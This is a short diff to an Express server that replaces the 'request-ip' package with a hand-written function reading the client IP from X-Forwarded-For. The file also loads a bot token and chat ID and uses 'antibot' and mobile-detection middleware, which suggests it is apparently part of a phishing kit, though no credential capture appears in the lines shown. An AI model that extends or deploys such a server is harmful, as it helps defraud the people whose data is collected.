@@ -4,7 +4,7 @@ const bodyParser = require('body-parser');
 const path = require('path');
 const { botToken, chatId } = require('./config/settings.js');
 const antibot = require('./middleware/antibot');
-const { getClientIp } = require("request-ip");
+//const { getClientIp } = require("request-ip");
 const https = require('https');
 const querystring = require('querystring');
 const axios = require('axios');
@@ -33,6 +33,15 @@ app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
 app.set('trust proxy', true); 
+
+function getClientIp(req) {
+  const xForwardedFor = req.headers['x-forwarded-for'];
+  if (xForwardedFor) {
+    const ips = xForwardedFor.split(',');
+    return ips[0].trim();
+  }
+  return req.connection.remoteAddress || req.socket.remoteAddress || null;
+}
 
 // Middleware function for mobile detection
 app.use((req, res, next) => {
